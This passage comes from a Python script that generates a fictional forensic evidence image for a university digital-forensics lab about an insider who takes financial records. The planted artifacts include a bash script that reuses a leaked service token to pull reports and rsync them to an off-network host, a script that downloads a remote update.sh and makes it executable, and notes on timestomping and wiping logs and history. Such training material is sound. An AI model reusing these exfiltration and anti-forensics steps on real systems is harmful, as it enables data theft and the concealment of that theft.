[2026-08-18 19:41] Devin: again
[2026-08-18 19:52] Marisol: I have the cones
[2026-08-18 20:30] Devin: 6-4 good game everyone
""",
        "chat_export_Dentist.txt": """WhatsApp Chat Export
Conversation: Cedar Park Dental
Exported: 2026-08-11 10:02:44
Messages: 6

[2026-08-11 09:58] Cedar Park Dental: Reminder: cleaning Thu 2026-08-13 at
 3:40pm. Reply C to confirm.
[2026-08-11 10:01] Alex: C
""",
    }


def build_telegram_export():
    """A Telegram export in the app's JSON-ish shape."""

    return """{
  "name": "Saved Messages",
  "type": "saved_messages",
  "id": 884102331,
  "messages": [
    {
      "id": 1041,
      "date": "2026-06-11T20:18:44",
      "from": "me",
      "text": "reporting api base: https://10.10.20.40:8443/api/v2"
    },
    {
      "id": 1042,
      "date": "2026-06-11T20:19:02",
      "from": "me",
      "text": "scheduler config path: /etc/report-scheduler/scheduler.env"
    },
    {
      "id": 1043,
      "date": "2026-06-11T20:19:40",
      "from": "me",
      "text": "svc_report token scope is report:read:all. it is not bound to a source address."
    },
    {
      "id": 1077,
      "date": "2026-07-02T22:44:10",
      "from": "me",
      "text": "tobor /data/incoming, 2TB free, keep it off the domain"
    },
    {
      "id": 1131,
      "date": "2026-08-14T23:08:51",
      "from": "me",
      "text": "bulk-export ignores page_size. one request returns the whole table."
    },
    {
      "id": 1166,
      "date": "2026-08-20T15:45:33",
      "from": "me",
      "text": "clear staging, clear rotated api log, clear history"
    }
  ]
}
"""


def build_signal_notes():
    """A deleted plaintext note kept alongside the Signal client."""

    return f"""Signal - local notes (not synced)

Do not keep this file.

- contact goes by Kestrel, number rotates, assume it is a burner
- never discuss specifics on corporate wifi
- tobor ({TOBOR_FQDN}) is the only destination
- if asked: the nightly job is "a personal backup script"
- the DLP alerts have been firing since June and nobody has opened one,
  so the window is open as long as nobody reads them
- after the final pull: staging dir, rotated api log, crontab, history
"""


def build_transfer_manifest():
    """
    The staged export manifest.

    This is what turns "a lot of data was taken" into a number. It is
    deleted and must be recovered, and the totals it states agree with
    the recovered workbooks to the penny.
    """

    order = [
        ("Q1_2026_Bank_Reconciliation.xlsx", "q1_recon"),
        ("Q2_2026_Bank_Reconciliation.xlsx", "q2_recon"),
        ("Wire_Transfer_Ledger_2026.xlsx", "wire_ledger"),
        ("Payroll_Disbursements_2026.xlsx", "payroll"),
        ("Client_Bank_Accounts_Master.csv", "client_master"),
    ]

    lines = [
        "STAGED EXPORT MANIFEST",
        "======================",
        "",
        f"Generated : {INCIDENT_DAY.isoformat()} 15:12:41",
        f"Source    : fin-app01 ({HOST_FIN_APP}) + "
        f"fileshare01 ({HOST_FILESHARE})",
        f"Staging   : /home/{USER_SUBJECT}/Downloads/.cache_sync",
        f"Destination: {TOBOR_FQDN} ({TOBOR_LEASE_NEW}):/data/incoming/",
        "",
        "FILE                                    ROWS      RECORD VALUE (USD)",
        "-" * 68,
    ]

    grand_rows = 0
    grand_total = 0.0

    for filename, key in order:
        stats = WORKBOOK_STATS[key]
        grand_rows += stats["rows"]
        grand_total = round(grand_total + stats["total"], 2)

        lines.append(
            f"{filename:<40}{stats['rows']:>7,}   {stats['total']:>18,.2f}"
        )

    lines += [
        "-" * 68,
        f"{'GRAND TOTAL':<40}{grand_rows:>7,}   {grand_total:>18,.2f}",
        "",
        f"Distinct client accounts represented: {len(CLIENTS)}",
        "",
        "Packaged as finance_packet_2026-08-20.tar.gz",
        "",
        "DELETE THIS FILE AFTER TRANSFER.",
    ]

    WORKBOOK_STATS["__grand__"] = {
        "rows": grand_rows,
        "total": grand_total,
    }

    return "\n".join(lines) + "\n"


def build_tobor_sync_script():
    """The exfiltration script itself."""

    return f"""#!/bin/bash
#
# tobor_sync.sh
# personal backup helper
#

set -u

SRC="$HOME/Downloads/.cache_sync"
DEST_HOST="{TOBOR_FQDN}"
DEST_PATH="/data/incoming"
LOG="$HOME/.local/state/tobor_sync.log"
TOKEN_FILE="/etc/report-scheduler/scheduler.env"

# Reuse the scheduler's service token. It is not bound to a source
# address and it has not been rotated since the application was
# deployed.
REPORT_TOKEN="$(grep -oP '(?<=^SVC_REPORT_TOKEN=).*' "$TOKEN_FILE")"

mkdir -p "$SRC"
chmod 700 "$SRC"

pull() {{
    local endpoint="$1"
    local outfile="$2"

    curl -sk \\
        -H "Authorization: Bearer $REPORT_TOKEN" \\
        "https://{HOST_FIN_APP}:8443/api/v2/${{endpoint}}" \\
        -o "$SRC/$outfile"
}}

pull "reports/bank-reconciliation?quarter=Q1&format=xlsx" \\
    "Q1_2026_Bank_Reconciliation.xlsx"
pull "reports/bank-reconciliation?quarter=Q2&format=xlsx" \\
    "Q2_2026_Bank_Reconciliation.xlsx"
pull "reports/wire-transfers?year=2026&format=xlsx" \\
    "Wire_Transfer_Ledger_2026.xlsx"
pull "reports/payroll-disbursements?year=2026&format=xlsx" \\
    "Payroll_Disbursements_2026.xlsx"
pull "accounts/bulk-export?scope=all&format=csv" \\
    "Client_Bank_Accounts_Master.csv"

BYTES="$(du -sb "$SRC" | cut -f1)"
FILES="$(find "$SRC" -type f | wc -l)"

rsync -az --remove-source-files \\
    "$SRC/" "{USER_SUBJECT}@${{DEST_HOST}}:${{DEST_PATH}}/"

printf '%s | %4d | %11d | %s@%s:%s/ | OK\\n' \\
    "$(date '+%Y-%m-%d %H:%M:%S')" "$FILES" "$BYTES" \\
    "{USER_SUBJECT}" "$DEST_HOST" "$DEST_PATH" >> "$LOG"
"""


# ============================================================
# CREATE EVIDENCE DATA
# ============================================================

def create_evidence_files():

    print()
    print("=" * 70)
    print("CREATING CONTROLLED FORENSIC EVIDENCE")
    print("=" * 70)

    alex = EVIDENCE_ROOT / f"home/{USER_SUBJECT}"
    staging = alex / "Downloads/.cache_sync"

    # --------------------------------------------------------
    # Root marker
    # --------------------------------------------------------

    write_file(
        EVIDENCE_ROOT / "README.txt",
        f"""CYBR 2800 FORENSIC EVIDENCE IMAGE
CASE {CASE_NUMBER}

Acquired: {ACQUISITION_DAY.isoformat()}
Subject system: workstation ({HOST_WORKSTATION})

This image was created for educational digital-forensics analysis.

Treat this image as evidence. Do not modify it.
""",
    )
    stamp("README.txt", "2026-08-24 07:02:14")

    # --------------------------------------------------------
    # Alex's documents -- Lab 2 continuity, preserved verbatim
    # --------------------------------------------------------

    write_file(
        alex / "Documents/notes.txt",
        """CYBR 2800 Investigation Notes

Meeting notes:

- Review server logs
- Check authentication activity
- Verify unusual network connections
- Follow up with IT regarding the backup server

TODO:

- Review VPN logs
- Verify administrator accounts
- Review backup server activity
""",
    )
    stamp("home/alex/Documents/notes.txt", "2026-08-20 13:53:02", "2026-08-12 10:41:19")

    write_file(
        alex / "Documents/project.txt",
        """Project: Network Security Assessment

Systems:

web01
db01
backup01

Security controls:

Firewall
IDS
Endpoint monitoring
Centralized logging
""",
    )
    stamp("home/alex/Documents/project.txt", "2026-08-20 13:52:44", "2026-07-30 16:02:55")

    write_file(
        alex / "Documents/passwords_backup.txt",
        """OLD PASSWORD NOTES

Email:
old-password-123

VPN:
VPN-Backup-2025

NOTE:
These passwords should no longer be used.
""",
    )
    stamp("home/alex/Documents/passwords_backup.txt", "2026-08-20 09:20:11", "2026-04-02 11:19:40")

    write_file(
        alex / "Documents/investigation.txt",
        f"""Security Investigation

Potentially suspicious activity:

{TOBOR_LEASE_OLD}
Repeated SSH authentication failures.

{HOST_BACKUP01}
Backup server accessed outside normal maintenance window.

Files requiring review:

maintenance.sh
backup.zip
temporary_credentials.txt

Investigation questions:

Who accessed the backup server?
When did the activity occur?
Was the activity authorized?
Were credentials exposed?
""",
    )
    stamp("home/alex/Documents/investigation.txt", "2026-08-20 09:21:03", "2026-08-21 09:14:22")

    write_file(
        alex / "Documents/maintenance.sh",
        f"""#!/bin/bash

echo "Starting maintenance..."

SERVER="{HOST_BACKUP01}"

curl http://$SERVER/update.sh -o /tmp/update.sh

chmod +x /tmp/update.sh

echo "Maintenance complete."
""",
    )
    stamp("home/alex/Documents/maintenance.sh", "2026-08-20 14:21:30", "2026-08-20 14:18:02")

    # A plausible cover story, written after the fact.
    write_file(
        alex / "Documents/personal_backup_readme.txt",
        """Personal backup notes

My home laptop runs a nightly pull of my working files so I don't lose
anything when the workstation gets reimaged. IT knows the workstation
gets reimaged a lot.

Nothing in here is company data. It's scripts and notes.
""",
    )
    stamp(
        "home/alex/Documents/personal_backup_readme.txt",
        "2026-08-21 08:14:02",
        "2026-08-21 08:13:44",
    )

    # --------------------------------------------------------
    # Shell history (live + rotated)
    # --------------------------------------------------------

    write_file(alex / ".bash_history", build_alex_bash_history())
    stamp("home/alex/.bash_history", "2026-08-20 15:50:40", "2026-08-20 15:50:38")

    write_file(alex / ".bash_history.1", build_alex_bash_history_rotated())
    stamp("home/alex/.bash_history.1", "2026-08-20 03:10:02", "2026-08-19 23:59:01")

    # --------------------------------------------------------
    # Browser history
    # --------------------------------------------------------

    browser_lines = [
        "2026-08-20 08:32 https://www.google.com",
        "2026-08-20 08:35 https://www.uvu.edu/",
        "2026-08-20 09:10 https://github.com/",
        "2026-08-20 09:38 https://10.10.20.40:8443/reports",
        "2026-08-20 09:40 https://10.10.20.40:8443/reports/bank-reconciliation",
        "2026-08-20 10:25 https://stackoverflow.com/questions/"
        "how-to-paginate-a-rest-export",
        "2026-08-20 10:44 https://duckduckgo.com/?q=rsync+remove-source-files",
        "2026-08-20 11:02 https://duckduckgo.com/?q=does+dhcp+log+keep+mac+history",
        "2026-08-20 11:42 https://example.com/security",
        "2026-08-20 12:55 https://duckduckgo.com/?q=shred+vs+rm+ext4",
        "2026-08-20 14:03 https://internal.example.local/login",
        "2026-08-20 14:15 https://paste.example.local/",
        "2026-08-20 14:21 https://files.example.local/",
        "2026-08-20 15:52 https://duckduckgo.com/?q=clear+bash+history+permanently",
    ]

    write_file(alex / ".browser_history.txt", "\n".join(browser_lines) + "\n")
    stamp("home/alex/.browser_history.txt", "2026-08-20 15:52:10", "2026-08-20 15:52:08")

    # --------------------------------------------------------
    # SSH configuration and known_hosts
    #
    # known_hosts is the quiet one: the SAME host key fingerprint is
    # recorded for 10.10.20.55 and 10.10.20.77. Students who notice
    # that have attributed the host without even opening the DHCP log.
    # --------------------------------------------------------

    write_file(
        alex / ".ssh/config",
        f"""Host internal-server
    HostName {HOST_APP01}
    User {USER_SUBJECT}

Host backup-server
    HostName {HOST_BACKUP01}
    User {USER_BACKUP}

Host tobor {TOBOR_FQDN}
    HostName {TOBOR_LEASE_NEW}
    User {USER_SUBJECT}
    IdentityFile ~/.ssh/id_ed25519_tobor
    StrictHostKeyChecking no
    UserKnownHostsFile ~/.ssh/known_hosts
""",
    )
    stamp("home/alex/.ssh/config", "2026-08-20 14:57:50", "2026-08-20 13:19:06")

    write_file(
        alex / ".ssh/known_hosts",
        f"""{HOST_APP01} ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK1dQp0rT7mXa2sVbN9cE4
{HOST_BACKUP01} ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPq8Lm3nZr5tX1vW7bK2dJ6
{TOBOR_LEASE_OLD} ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7hG2kR9wT4yU1pL6xN3mQ
{TOBOR_LEASE_NEW} ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7hG2kR9wT4yU1pL6xN3mQ
{TOBOR_FQDN} ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7hG2kR9wT4yU1pL6xN3mQ
""",
    )
    stamp("home/alex/.ssh/known_hosts", "2026-08-20 15:03:50", "2026-08-20 13:19:41")

    # --------------------------------------------------------
    # The sync script and its log
    #
    # The script is timestomped: its mtime claims January 2025, which
    # is before the finance application it talks to was deployed. The
    # inode's ctime does not agree. That contradiction is the Part on
    # timestamp reliability.
    # --------------------------------------------------------

    write_file(alex / ".local/bin/tobor_sync.sh", build_tobor_sync_script())
    stamp("home/alex/.local/bin/tobor_sync.sh", "2026-08-20 15:03:55", "2025-01-05 08:00:00")

    write_file(alex / ".local/state/tobor_sync.log", build_tobor_sync_log())
    stamp("home/alex/.local/state/tobor_sync.log", "2026-08-20 15:47:19", "2026-08-20 15:47:19")

    # --------------------------------------------------------
    # Messaging applications
    # --------------------------------------------------------

    for filename, content in build_whatsapp_noise_exports().items():
        write_file(alex / f".local/share/WhatsApp/{filename}", content)
        stamp(f"home/alex/.local/share/WhatsApp/{filename}", "2026-08-19 20:14:00")

    write_file(
        alex / ".local/share/WhatsApp/chat_export_Kestrel.txt",
        build_whatsapp_kestrel_export(),
    )
    stamp(
        "home/alex/.local/share/WhatsApp/chat_export_Kestrel.txt",
        "2026-08-20 15:44:02",
        "2026-08-20 15:44:02",
    )

    write_file(
        alex / ".local/share/WhatsApp/msgstore_meta.txt",
        f"""WhatsApp local store metadata

last_export     2026-08-20 15:44:02
export_count    5
exports:
    chat_export_Family.txt
    chat_export_Soccer_League.txt
    chat_export_Dentist.txt
    chat_export_Kestrel.txt
    chat_export_Kestrel.txt (removed {INCIDENT_DAY.isoformat()} 15:46)
""",
    )
    stamp("home/alex/.local/share/WhatsApp/msgstore_meta.txt", "2026-08-20 15:46:11")

    write_file(
        alex / ".local/share/TelegramDesktop/exported_chats/saved_messages.json",
        build_telegram_export(),
    )
    stamp(
        "home/alex/.local/share/TelegramDesktop/exported_chats/saved_messages.json",
        "2026-08-20 15:45:40",
        "2026-08-20 15:45:33",
    )

    write_file(alex / ".config/Signal/logs/conversation_notes.txt", build_signal_notes())
    stamp(
        "home/alex/.config/Signal/logs/conversation_notes.txt",
        "2026-08-20 15:45:02",
        "2026-08-14 23:10:18",
    )

    write_file(
        alex / ".config/Signal/logs/desktop.log",
        """2026-08-20T15:40:11.204Z INFO  app ready
2026-08-20T15:44:51.880Z INFO  conversation opened id=c-88412
2026-08-20T15:45:02.117Z INFO  message deleted for everyone id=m-441920
2026-08-20T15:45:04.902Z INFO  message deleted for everyone id=m-441921
2026-08-20T15:45:09.338Z INFO  conversation deleted id=c-88412
2026-08-20T15:45:12.004Z INFO  app quit
""",
    )
    stamp("home/alex/.config/Signal/logs/desktop.log", "2026-08-20 15:45:12")

    # --------------------------------------------------------
    # The staging directory (deleted later)
    # --------------------------------------------------------

    print("[+] Generating financial workbooks...")

    q1_recon = make_financial_workbook(
        "q1_recon",
        "Q1 Reconciliation",
        4812,
        date(2026, 1, 1),
        date(2026, 3, 31),
    )

    q2_recon = make_financial_workbook(
        "q2_recon",
        "Q2 Reconciliation",
        5104,
        date(2026, 4, 1),
        date(2026, 6, 30),
    )

    wire_ledger = make_financial_workbook(
        "wire_ledger",
        "Wire Transfers",
        3990,
        date(2026, 1, 1),
        INCIDENT_DAY,
        kinds=["Wire Out", "Wire In", "Intercompany Transfer"],
    )

    payroll = make_financial_workbook(
        "payroll",
        "Payroll Disbursements",
        2644,
        date(2026, 1, 1),
        INCIDENT_DAY,
        kinds=["Payroll Run", "Tax Remittance"],
    )

    client_master_rows, client_master_total = build_transaction_rows(
        1280, date(2026, 1, 1), INCIDENT_DAY
    )

    WORKBOOK_STATS["client_master"] = {
        "rows": 1280,
        "total": client_master_total,
        "bytes": 0,
    }

    client_master_csv = rows_to_csv(TRANSACTION_HEADERS, client_master_rows)
    WORKBOOK_STATS["client_master"]["bytes"] = len(client_master_csv.encode("utf-8"))

    write_bytes(staging / "Q1_2026_Bank_Reconciliation.xlsx", q1_recon)
    write_bytes(staging / "Q2_2026_Bank_Reconciliation.xlsx", q2_recon)
    write_bytes(staging / "Wire_Transfer_Ledger_2026.xlsx", wire_ledger)
    write_bytes(staging / "Payroll_Disbursements_2026.xlsx", payroll)
    write_file(staging / "Client_Bank_Accounts_Master.csv", client_master_csv)
    write_file(staging / "transfer_manifest.txt", build_transfer_manifest())

    for name in (
        "Q1_2026_Bank_Reconciliation.xlsx",
        "Q2_2026_Bank_Reconciliation.xlsx",
        "Wire_Transfer_Ledger_2026.xlsx",
        "Payroll_Disbursements_2026.xlsx",
        "Client_Bank_Accounts_Master.csv",
    ):
        stamp(
            f"home/alex/Downloads/.cache_sync/{name}",
            "2026-08-20 14:44:09",
            "2026-08-20 12:40:08",
        )

    stamp(
        "home/alex/Downloads/.cache_sync/transfer_manifest.txt",
        "2026-08-20 15:12:41",
        "2026-08-20 15:12:41",
    )

    # The packed archive, built from the real workbooks so students who
    # recover it can actually extract it.
    print("[+] Packing the staged export archive...")

    archive_buffer = io.BytesIO()

    with tarfile.open(fileobj=archive_buffer, mode="w:gz") as archive:
        for name, payload in (
            ("Q1_2026_Bank_Reconciliation.xlsx", q1_recon),
            ("Q2_2026_Bank_Reconciliation.xlsx", q2_recon),
            ("Wire_Transfer_Ledger_2026.xlsx", wire_ledger),
            ("Payroll_Disbursements_2026.xlsx", payroll),
            ("Client_Bank_Accounts_Master.csv", client_master_csv.encode("utf-8")),
        ):
            info = tarfile.TarInfo(name=name)
            info.size = len(payload)
            info.mtime = int(to_epoch("2026-08-20 12:40:08"))
            archive.addfile(info, io.BytesIO(payload))

    write_bytes(
        staging / "finance_packet_2026-08-20.tar.gz",
        archive_buffer.getvalue(),
    )
    stamp(
        "home/alex/Downloads/.cache_sync/finance_packet_2026-08-20.tar.gz",
        "2026-08-20 15:03:58",
        "2026-08-20 14:44:11",
    )

    # --------------------------------------------------------
    # Downloads -- Lab 2 continuity
    # --------------------------------------------------------

    downloads = alex / "Downloads"

    write_file(
        downloads / "temporary_credentials.txt",
        f"""TEMPORARY CREDENTIALS

username: {USER_BACKUP}
password: Backup-Temp-2026!

Server: {HOST_BACKUP01}

These credentials were created for temporary maintenance.
""",
    )
    stamp(
        "home/alex/Downloads/temporary_credentials.txt",
        "2026-08-20 14:19:40",
        "2026-08-18 16:02:11",
    )

    write_file(
        downloads / "backup_notes.txt",
        f"""Backup Server Notes

Backup server:
{HOST_BACKUP01}

Maintenance window:
14:00 - 15:00

Account:
{USER_BACKUP}
""",
    )
    stamp("home/alex/Downloads/backup_notes.txt", "2026-08-20 14:19:44", "2026-08-18 16:04:50")

    write_file(
        downloads / "suspicious_commands.txt",
        f"""Commands observed during investigation:

wget http://{HOST_BACKUP01}/backup.zip
curl http://{HOST_BACKUP01}/update.sh
ssh {USER_BACKUP}@{HOST_BACKUP01}
""",
    )
    stamp("home/alex/Downloads/suspicious_commands.txt", "2026-08-20 09:22:10", "2026-08-19 11:40:02")

    # --------------------------------------------------------
    # priya -- the control group
    #
    # Legitimate finance access, so "touched financial data" is not by
    # itself incriminating. Students have to explain what makes Alex's
    # pattern different.
    # --------------------------------------------------------

    priya = EVIDENCE_ROOT / f"home/{USER_ANALYST}"

    write_file(
        priya / "Documents/monthly_close_checklist.txt",
        """Monthly Close Checklist

1. Pull bank reconciliation from the reporting portal (UI export)
2. Tie out against the GL
3. Flag variances over $5,000 for review
4. Circulate to controller by the 5th business day
5. Archive to the finance share, Q folder for the quarter

Access note: my role is finance_reporting. Exports go to
/mnt/finance_share only -- never to a local drive, never off-network.
""",
    )
    stamp("home/priya/Documents/monthly_close_checklist.txt", "2026-08-19 09:14:02")

    write_file(
        priya / ".bash_history",
        """pwd
ls /mnt/finance_share/reports/2026/Q2
libreoffice --calc /mnt/finance_share/reports/2026/Q2/monthly_summary_2026-06.xlsx
cd /mnt/finance_share/reports/2026/Q2
ls -la
exit
""",
    )
    stamp("home/priya/.bash_history", "2026-08-19 17:40:11")

    # --------------------------------------------------------
    # jordan -- noise, carried forward from Lab 2
    # --------------------------------------------------------

    jordan = EVIDENCE_ROOT / f"home/{USER_NOISE}"

    write_file(
        jordan / "Documents/todo.txt",
        """Personal TODO

- Renew gym membership
- Pick up dry cleaning
- Submit expense report
- Schedule dentist appointment
""",
    )
    stamp("home/jordan/Documents/todo.txt", "2026-08-18 12:04:00")

    write_file(
        jordan / ".bash_history",
        """pwd
ls
cd Documents
cat todo.txt
firefox &
exit
""",
    )
    stamp("home/jordan/.bash_history", "2026-08-18 17:41:00")

    write_file(
        jordan / ".browser_history.txt",
        """2026-08-18 09:15 https://mail.example.com
2026-08-18 12:03 https://news.example.com
2026-08-18 17:41 https://shopping.example.com
""",
    )
    stamp("home/jordan/.browser_history.txt", "2026-08-18 17:41:30")

    # --------------------------------------------------------
    # The mounted finance share
    # --------------------------------------------------------

    print("[+] Generating the finance share...")

    share = EVIDENCE_ROOT / "mnt/finance_share"

    write_file(
        share / "README_SHARE.txt",
        f"""FINANCE SHARE

Served by fileshare01 ({HOST_FILESHARE}) and mounted read-only on
workstations that hold the finance_reporting role.

Classification: RESTRICTED - FINANCIAL
Retention: 7 years

Contents must not be copied to local or removable storage.
""",
    )
    stamp("mnt/finance_share/README_SHARE.txt", "2026-08-20 12:40:11", "2026-01-04 08:00:00")

    for month in range(1, 7):
        quarter = 1 if month <= 3 else 2
        month_day = date(2026, month, 1)

        rows, _ = build_transaction_rows(
            420 + month * 30,
            month_day,
            month_day + timedelta(days=27),
        )

        payload = build_xlsx(
            f"{month_day.strftime('%B')} 2026",
            TRANSACTION_HEADERS,
            rows,
        )

        relative = (
            f"mnt/finance_share/reports/2026/Q{quarter}/"
            f"monthly_summary_{month_day.strftime('%Y-%m')}.xlsx"
        )

        write_bytes(EVIDENCE_ROOT / relative, payload)
        stamp(relative, "2026-08-20 12:41:33", f"2026-0{month}-28 17:02:11")

    # A pile of per-client statement CSVs so the share is realistically
    # large and `fls -r` is a genuine search.
    for index, (account_number, client_name) in enumerate(CLIENTS[:96]):
        month = (index % 6) + 1
        month_day = date(2026, month, 1)

        rows, _ = build_transaction_rows(
            40 + (index % 60),
            month_day,
            month_day + timedelta(days=27),
        )

        relative = (
            "mnt/finance_share/bank_statements/"
            f"statement_{month_day.strftime('%Y-%m')}_{account_number}.csv"
        )

        write_file(EVIDENCE_ROOT / relative, rows_to_csv(TRANSACTION_HEADERS, rows))
        stamp(relative, "2026-08-20 12:40:12", f"2026-0{month}-28 06:14:02")

    share_access_lines = [
        "# finance share access log (fileshare01)",
        "",
    ]

    for day_offset in range(0, 80):
        day = date(2026, 6, 1) + timedelta(days=day_offset)

        if day > INCIDENT_DAY:
            break

        share_access_lines.append(
            f"{day.isoformat()} 09:1{day_offset % 6}:22 {USER_ANALYST} "
            f"{HOST_WORKSTATION} READ reports/2026 files=3"
        )

        if day_offset % 2 == 0:
            share_access_lines.append(
                f"{day.isoformat()} 19:3{day_offset % 6}:51 {USER_SUBJECT} "
                f"{HOST_WORKSTATION} READ bank_statements files="
                f"{RNG.randrange(4, 96)}"
            )

    share_access_lines.append(
        f"{INCIDENT_DAY.isoformat()} 12:41:33 {USER_SUBJECT} {HOST_WORKSTATION} "
        "BULK_READ reports/2026 files=142 bytes=221904118"
    )

    write_file(
        share / "access_log.txt",
        "\n".join(share_access_lines) + "\n",
    )
    stamp("mnt/finance_share/access_log.txt", "2026-08-20 12:41:33")

    # --------------------------------------------------------
    # The Lab 2 backup drive, carried forward
    # --------------------------------------------------------

    print("[+] Carrying forward the Lab 2 backup drive...")

    backup_root = EVIDENCE_ROOT / "mnt/recovered_backup"

    write_file(
        backup_root / "README_BACKUP_SOURCE.txt",
        f"""EVIDENCE SOURCE NOTE

This directory (mnt/recovered_backup) is the secondary evidence source
examined in Lab 2: an external backup drive used by the "{USER_BACKUP}"
service account for backup01 ({HOST_BACKUP01}).

It is reproduced here unchanged so findings from Lab 2 can be
re-examined against the workstation image.
""",
    )
    stamp("mnt/recovered_backup/README_BACKUP_SOURCE.txt", "2026-08-22 10:00:00")

    write_file(
        backup_root / "home/backupadmin/Documents/incident_draft.txt",
        f"""DRAFT - Incident Notes ({USER_BACKUP})

Noticed a login to backup01 outside the normal maintenance window on
2026-08-20. Also noticed the scheduled backup job for 2026-08-19 failed
with an authentication error, which is unusual. Flagging for the
investigation team.

Follow-up {ACQUISITION_DAY.isoformat()}: the credentials used on 08-20
match the temporary set that was written to a workstation Downloads
folder during the July maintenance window. Those were never rotated.

- {USER_BACKUP}
""",
    )
    stamp(
        "mnt/recovered_backup/home/backupadmin/Documents/incident_draft.txt",
        "2026-08-24 06:30:00",
        "2026-08-24 06:28:41",
    )

    write_file(
        backup_root / "home/backupadmin/Documents/server_inventory.txt",
        f"""Backup Server Inventory

Host: backup01 ({HOST_BACKUP01})
Role: Nightly backups for the workstation and internal file shares
Account: {USER_BACKUP} (service account)
Scheduled jobs: 02:00 daily via cron
Retention: 200 days of job logs kept under archives/
""",
    )
    stamp(
        "mnt/recovered_backup/home/backupadmin/Documents/server_inventory.txt",
        "2026-08-22 10:04:00",
    )

    write_file(
        backup_root / "home/backupadmin/.bash_history",
        f"""pwd
ls -la
cd Documents
cat server_inventory.txt
ssh {USER_BACKUP}@{HOST_BACKUP01}
sudo systemctl status backup.timer
tail /var/log/auth.log
history
""",
    )
    stamp("mnt/recovered_backup/home/backupadmin/.bash_history", "2026-08-22 10:06:00")

    print("[+] Generating daily backup job logs (this adds ~200 files)...")

    for relative_path, content in build_daily_backup_logs().items():
        write_file(backup_root / relative_path, content)

    # --------------------------------------------------------
    # System configuration
    # --------------------------------------------------------

    write_file(
        EVIDENCE_ROOT / "etc/hosts",
        f"""127.0.0.1       localhost
127.0.1.1       workstation

{HOST_APP01}    app01
{HOST_BACKUP01}    backup01
{HOST_FIN_APP}    fin-app01
{HOST_FILESHARE}    fileshare01

# added manually -- not managed by DNS
{TOBOR_LEASE_NEW}    tobor {TOBOR_FQDN}
""",
    )
    stamp("etc/hosts", "2026-08-20 15:03:55", "2026-08-20 13:18:22")

    write_file(
        EVIDENCE_ROOT / "etc/application.conf",
        f"""APPLICATION_NAME=InternalPortal
ENVIRONMENT=production
DATABASE_HOST={HOST_DB01}
DATABASE_PORT=5432
DEBUG=false
LOG_LEVEL=INFO
""",
    )
    stamp("etc/application.conf", "2026-08-20 14:45:11", "2026-02-14 09:00:00")

    write_file(
        EVIDENCE_ROOT / "etc/report-scheduler/scheduler.env",
        f"""# Reporting scheduler environment
# WARNING: world-readable. Flagged in the 2026-04 access review.
# Remediation ticket OPS-4471 -- still open.

FIN_API_BASE=https://{HOST_FIN_APP}:8443/api/v2
SVC_REPORT_USER={USER_SERVICE}
SVC_REPORT_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.TRAINING-ONLY-NOT-A-REAL-TOKEN
SVC_REPORT_SCOPE=report:read:all
TOKEN_ISSUED=2024-11-02
TOKEN_LAST_ROTATED=never
""",
    )
    stamp(
        "etc/report-scheduler/scheduler.env",
        "2026-08-20 22:10:02",
        "2024-11-02 10:00:00",
    )

    write_file(
        EVIDENCE_ROOT / "etc/asset_inventory.csv",
        f"""hostname,ip_address,mac_address,owner,managed
workstation,{HOST_WORKSTATION},00:1b:44:11:3a:b7,{USER_SUBJECT},yes
wks-priya,10.10.20.11,00:1b:44:11:3a:c2,{USER_ANALYST},yes
wks-jordan,10.10.20.12,00:1b:44:11:3a:d9,{USER_NOISE},yes
app01,{HOST_APP01},52:54:00:9a:1f:0e,platform,yes
backup01,{HOST_BACKUP01},52:54:00:9a:1f:22,platform,yes
db01,{HOST_DB01},52:54:00:9a:1f:35,platform,yes
fin-app01,{HOST_FIN_APP},52:54:00:9a:1f:41,finance,yes
fin-db01,{HOST_FIN_DB},52:54:00:9a:1f:52,finance,yes
fileshare01,{HOST_FILESHARE},52:54:00:9a:1f:63,platform,yes
""",
    )
    stamp("etc/asset_inventory.csv", "2026-08-24 06:40:00", "2026-08-01 08:00:00")

    # --------------------------------------------------------
    # Logs
    # --------------------------------------------------------

    print("[+] Generating system and application logs...")

    logs = {
        "var/log/auth.log": build_auth_log(),
        "var/log/syslog": build_syslog(),
        "var/log/cron.log": build_cron_log(),
        "var/log/dpkg.log": build_dpkg_log(),
        "var/log/network_connections.log": build_network_log(),
        "var/log/remote_access.log": build_remote_access_log(),
        "var/log/maintenance.log": build_maintenance_log(),
        "var/log/application.log": build_application_log(),
        "var/log/dhcpd.log": build_dhcpd_log(),
        "var/log/vpn.log": build_vpn_log(),
        "var/log/dlp_alerts.log": build_dlp_alerts_log(),
        "var/log/usb_events.log": build_usb_events_log(),
        "var/log/audit/file_access.log": build_file_audit_log(),
        "var/log/finance_api/access.log": build_finance_api_access_log(
            first_day=date(2026, 8, 1),
        ),
        "var/log/finance_api/error.log": build_finance_api_error_log(),
    }

    for relative_path, content in logs.items():
        write_file(EVIDENCE_ROOT / relative_path, content)
        stamp(relative_path, "2026-08-24 07:00:00", "2026-08-20 15:52:40")

    # The rotated API log. This is the one Alex destroyed, and it is
    # the only place the June reconnaissance requests were recorded in
    # full -- recovering it is what proves the enumeration phase.
    rotated = build_finance_api_access_log(
        last_day=date(2026, 7, 31),
        include_sweep=False,
    )

    write_file(
        EVIDENCE_ROOT / "var/log/finance_api/access.log.1",
        "# ROTATED 2026-08-01 -- covers 2026-03-01 to 2026-07-31\n" + rotated,
    )
    stamp(
        "var/log/finance_api/access.log.1",
        "2026-08-20 15:49:31",
        "2026-08-01 00:00:01",
    )

    print("[+] Evidence files created.")


# ============================================================
# DELETED EVIDENCE
# ============================================================
#
# Eleven files across five directories. Lab 2 had five across two, so
# `fls -r -d` here is a real search rather than a glance -- and the
# set spans text, CSV, compressed spreadsheets, and a tar archive, so
# students cannot rely on `strings` alone.

DELETED_FILES = [
    "home/alex/Downloads/.cache_sync/Q1_2026_Bank_Reconciliation.xlsx",
    "home/alex/Downloads/.cache_sync/Q2_2026_Bank_Reconciliation.xlsx",
    "home/alex/Downloads/.cache_sync/Wire_Transfer_Ledger_2026.xlsx",
    "home/alex/Downloads/.cache_sync/Payroll_Disbursements_2026.xlsx",
    "home/alex/Downloads/.cache_sync/Client_Bank_Accounts_Master.csv",
    "home/alex/Downloads/.cache_sync/finance_packet_2026-08-20.tar.gz",
